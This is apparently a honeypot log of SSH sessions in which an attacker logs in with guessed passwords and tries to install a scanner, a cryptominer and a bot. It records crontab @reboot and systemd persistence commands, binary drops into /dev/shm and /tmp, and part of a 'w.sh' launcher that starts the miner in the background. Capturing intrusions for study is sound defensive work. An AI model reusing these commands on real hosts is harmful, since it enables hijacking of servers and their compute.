+[2026-04-20 18:43:06.653784 UTC] [1776710585_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:43:06.848394 UTC] [1776710585_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service' | exit_code=127 | stdout_bytes=0 | stderr_bytes=28
+
+[2026-04-20 18:43:06.848594 UTC] [1776710585_149.210.235.123_41472_sshshadow] [exec_stderr]
+exec.stderr
+sh: 1: systemctl: not found
+
+[2026-04-20 18:43:07.000000 UTC] [1776710585_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 18:43:07.000000 UTC] [1776710587_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710587_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:07.000010 UTC] [1776710587_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:43:07.000500 UTC] [1776710585_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:08.785133 UTC] [1776710587_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:43:08.993109 UTC] [1776710587_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10 | exit_code=0 | stdout_bytes=188 | stderr_bytes=0
+
+[2026-04-20 18:43:08.993209 UTC] [1776710587_149.210.235.123_41472_sshshadow] [exec_stdout]
+exec.stdout
+    PID %CPU COMMAND
+   1611 28.5 strace
+   1164  0.2 sshd
+   1167  0.0 sshd
+      1  0.0 bash
+    249  0.0 python3
+    248  0.0 sshd
+   1563  0.0 bash
+   1605  0.0 bash
+   1614  0.0 bash
+
+[2026-04-20 18:43:09.000000 UTC] [1776710587_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:43:09.000000 UTC] [1776710589_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710589_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:09.000010 UTC] [1776710589_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 18:43:09.000500 UTC] [1776710587_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:11.000000 UTC] [1776710589_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:43:11.000000 UTC] [1776710591_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710591_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:11.000010 UTC] [1776710591_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:43:11.000500 UTC] [1776710589_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:11.038549 UTC] [1776710589_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 18:43:11.267602 UTC] [1776710589_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=ps aux | grep astats | grep -v grep | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 18:43:11.267702 UTC] [1776710589_149.210.235.123_41472_sshshadow] [exec_stdout]
+exec.stdout
+0
+
+[2026-04-20 18:43:11.378777 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:38800 | raw=Connection from 149.210.235.123 port 38800 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:43:11.473025 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:38808 | raw=Connection from 149.210.235.123 port 38808 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 18:43:11.966612 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:38800 | user=admin | method=password | raw=Accepted password for admin from 149.210.235.123 port 38800 ssh2
+
+[2026-04-20 18:43:12.000000 UTC] [1776710592_149.210.235.123_38800_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710592_149.210.235.123_38800_sshshadow
+
+[2026-04-20 18:43:12.000010 UTC] [1776710592_149.210.235.123_38800_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 18:43:12.000020 UTC] [1776710592_149.210.235.123_38800_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:43:13.000000 UTC] [1776710591_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 18:43:13.000000 UTC] [1776710593_149.210.235.123_38800_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710593_149.210.235.123_38800_sshshadow
+
+[2026-04-20 18:43:13.000010 UTC] [1776710593_149.210.235.123_38800_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/tmp" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 18:43:13.000500 UTC] [1776710591_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:13.095997 UTC] [1776710591_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:43:13.324938 UTC] [1776710591_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 18:43:13.325138 UTC] [1776710591_149.210.235.123_41472_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 18:43:14.965068 UTC] [1776710593_149.210.235.123_38800_sshshadow] [command]
+ssh_exec | cwd=/home/admin | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/tmp" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 18:43:15.000000 UTC] [1776710593_149.210.235.123_38800_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 18:43:15.000000 UTC] [1776710595_149.210.235.123_38800_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710595_149.210.235.123_38800_sshshadow
+
+[2026-04-20 18:43:15.000000 UTC] [1776710595_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776710595_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:15.000010 UTC] [1776710595_149.210.235.123_38800_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:43:15.000010 UTC] [1776710595_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:43:15.000020 UTC] [1776710595_149.210.235.123_41472_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 18:43:15.000500 UTC] [1776710593_149.210.235.123_38800_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:15.157565 UTC] [1776710593_149.210.235.123_38800_sshshadow] [event]
+ssh_exec_complete | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /tmp/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/tmp" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+ | exit_code=127 | stdout_bytes=0 | stderr_bytes=46
+
+[2026-04-20 18:43:15.157765 UTC] [1776710593_149.210.235.123_38800_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-20 18:43:16.772794 UTC] [1776710595_149.210.235.123_38800_sshshadow] [command]
+ssh_exec | cwd=/home/admin | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 18:43:16.978276 UTC] [1776710595_149.210.235.123_38800_sshshadow] [event]
+ssh_exec_complete | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service' | exit_code=127 | stdout_bytes=0 | stderr_bytes=28
+
+[2026-04-20 18:43:16.978476 UTC] [1776710595_149.210.235.123_38800_sshshadow] [exec_stderr]
+exec.stderr
+sh: 1: systemctl: not found
+
+[2026-04-20 18:43:17.000000 UTC] [1776710595_149.210.235.123_38800_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 18:43:17.000000 UTC] [1776710597_149.210.235.123_38800_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710597_149.210.235.123_38800_sshshadow
+
+[2026-04-20 18:43:17.000010 UTC] [1776710597_149.210.235.123_38800_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:43:17.000500 UTC] [1776710595_149.210.235.123_38800_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:18.831035 UTC] [1776710597_149.210.235.123_38800_sshshadow] [command]
+ssh_exec | cwd=/home/admin | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 18:43:19.000000 UTC] [1776710597_149.210.235.123_38800_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 18:43:19.000000 UTC] [1776710599_149.210.235.123_41472_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776710599_149.210.235.123_41472_sshshadow
+
+[2026-04-20 18:43:19.000010 UTC] [1776710599_149.210.235.123_41472_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:43:19.000500 UTC] [1776710597_149.210.235.123_38800_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 18:43:19.034673 UTC] [1776710597_149.210.235.123_38800_sshshadow] [event]
+ssh_exec_complete | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10 | exit_code=0 | stdout_bytes=186 | stderr_bytes=0
+
+[2026-04-20 18:43:19.034773 UTC] [1776710597_149.210.235.123_38800_sshshadow] [exec_stdout]
+exec.stdout
+    PID %CPU COMMAND
+   2059 33.3 strace
+   2064 33.3 ps
+   1706  0.6 sshd
+   1167  0.2 sshd
+   1164  0.1 sshd
+      1  0.0 bash
+    249  0.0 python3
+    248  0.0 sshd
+   1739  0.0 sshd
+
+[2026-04-20 18:43:20.534346 UTC] [1776710599_149.210.235.123_41472_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 18:43:20.715049 UTC] [1776710599_149.210.235.123_41472_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 18:43:20.715249 UTC] [1776710599_149.210.235.123_41472_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 18:43:21.000000 UTC] [1776710599_149.210.235.123_41472_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 18:43:21.000500 UTC] [1776710599_149.210.235.123_41472_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:22.767832 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:60696 | raw=Connection from 149.210.235.123 port 60696 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-21 10:33:22.871748 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:60704 | raw=Connection from 149.210.235.123 port 60704 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-21 10:33:23.000000 UTC] [1776767603_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767603_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:23.000010 UTC] [1776767603_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-21 10:33:23.000020 UTC] [1776767603_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:23.000100 UTC] [1776767603_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+[2026-04-21 10:33:23.391183 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:60696 | user=deploy | method=password | raw=Accepted password for deploy from 149.210.235.123 port 60696 ssh2
+
+[2026-04-21 10:33:23.823423 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:23.874019 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:23.897096 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:26.149445 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:26.276385 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:26.299733 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:26.322535 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:26.656372 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:26.656517 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:26.656598 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:26.704508 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:26.751229 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=ok | message=chroot command exited cleanly | rc=0
+
+[2026-04-21 10:33:26.766047 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=ok | rc=0
+
+[2026-04-21 10:33:27.000000 UTC] [1776767603_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-21 10:33:27.000000 UTC] [1776767607_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767607_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:27.000010 UTC] [1776767607_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-21 10:33:27.000020 UTC] [1776767607_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:27.000100 UTC] [1776767607_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/dev/shm
+
+[2026-04-21 10:33:27.000500 UTC] [1776767603_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:27.075679 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:27.133475 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:27.186697 UTC] [1776767603_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=normal_exit | rc=0
+
+[2026-04-21 10:33:27.904187 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:27.953882 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:27.976707 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:29.607366 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:29.738905 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:29.762645 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:29.786330 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:29.989643 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:29.989844 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:29.989976 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:30.000000 UTC] [1776767607_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-21 10:33:30.000000 UTC] [1776767610_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767610_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:30.000010 UTC] [1776767610_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-21 10:33:30.000020 UTC] [1776767610_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:30.000100 UTC] [1776767610_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+/bin/bash: line 1: grep: command not found
+/bin/bash: line 1: wc: command not found
+/bin/cat: /proc/cpuinfo: No such file or directory
+
+[2026-04-21 10:33:30.000200 UTC] [1776767610_149.210.235.123_60696_sshshadow] [exec_stderr]
+exec.stderr
+request failed
+
+[2026-04-21 10:33:30.000500 UTC] [1776767607_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:30.045510 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:30.084316 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=ok | message=chroot command exited cleanly | rc=0
+
+[2026-04-21 10:33:30.099706 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=ok | rc=0
+
+[2026-04-21 10:33:30.331251 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:30.387369 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:30.434875 UTC] [1776767607_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=normal_exit | rc=0
+
+[2026-04-21 10:33:30.731720 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=start | message=forced-command entry
+
+[2026-04-21 10:33:30.780993 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_lock | status=ok | message=active session lock acquired
+
+[2026-04-21 10:33:30.804194 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=start | message=invoking root-session-client prepare
+
+[2026-04-21 10:33:32.829321 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_prepare | status=ok | message=prepare completed
+
+[2026-04-21 10:33:32.955885 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_create | status=ok | message=projection setup complete
+
+[2026-04-21 10:33:32.979043 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:mode_decision | status=ok | message=non_interactive_exec
+
+[2026-04-21 10:33:33.000000 UTC] [1776767610_149.210.235.123_60696_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-21 10:33:33.000400 UTC] [1776767610_149.210.235.123_60696_sshshadow] [chroot_launch.stderr]
+chroot_launch.stderr
+/bin/bash: line 1: grep: command not found
+/bin/bash: line 1: wc: command not found
+/bin/cat: /proc/cpuinfo: No such file or directory
+
+[2026-04-21 10:33:33.000500 UTC] [1776767610_149.210.235.123_60696_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [
+    "tmp/.ssh-shadow/session/commands.jsonl",
+    "tmp/.ssh-shadow/session/events.jsonl",
+    "tmp/.ssh-shadow/session/provenance.json"
+  ],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 3,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-21 10:33:33.002096 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=exec-original-command path
+
+[2026-04-21 10:33:33.237344 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=start | message=daemon launch request
+
+[2026-04-21 10:33:33.237476 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=fail | message=tty_path= control_fd=none
+
+[2026-04-21 10:33:33.237554 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_tty_attach | status=ok | message=fallback=script-pty
+
+[2026-04-21 10:33:33.273879 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:chroot_launch | status=start | message=launching chroot command
+
+[2026-04-21 10:33:33.387830 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:root_managed_launch_daemon | status=fail | rc=127
+
+[2026-04-21 10:33:33.661761 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=start | message=invoking root-session-client cleanup
+
+[2026-04-21 10:33:33.715936 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:cleanup_root_managed | status=ok | message=cleanup completed
+
+[2026-04-21 10:33:33.778069 UTC] [1776767610_149.210.235.123_60696_sshshadow] [bootstrap]
+bootstrap:session_finalize | status=ok | message=exit_code_127 | rc=127
+
+[2026-04-21 10:33:34.000000 UTC] [1776767614_149.210.235.123_60696_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776767614_149.210.235.123_60696_sshshadow
+
+[2026-04-21 10:33:34.000010 UTC] [1776767614_149.210.235.123_60696_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-21 10:33:34.000020 UTC] [1776767614_149.210.235.123_60696_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-21 10:33:34.000100 UTC] [1776767614_149.210.235.123_60696_sshshadow] [exec_stdout]
+exec.stdout
+#!/usr/bin/env bash
+set -euo pipefail
+
+DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
+SCAN_NAME="${1:-scanfile}"
+MINER_NAME="${2:-minefile}"
+BOT_NAME="${3:-botfile}"
+SCAN_ARGS="${4:-}"
+
+SCAN="$DIR/$SCAN_NAME"
+MINER="$DIR/$MINER_NAME"
+BOT="$DIR/$BOT_NAME"
+
+# normalize arch
+arch="$(uname -m || true)"
+case "$arch" in
+  x86_64|amd64) arch="amd64" ;;
+  aarch64) arch="arm64" ;;
+esac
+
+# cores
+cores="$(nproc 2>/dev/null || echo 1)"
+if [ -z "$cores" ]; then cores=1; fi
+
+# helper: start if not running
+start_bg() {
+  local bin="$1"; shift
+  local args=("$@")
+  [ -x "$bin" ] || chmod +x "$bin" 2>/dev/null || true
+  if ! pgrep -f -- "$bin" >/dev/null 2>&1; then
+    nohup "$bin" "${args[@]}" >/dev/null 2>&1 &
+  fi
+}
+
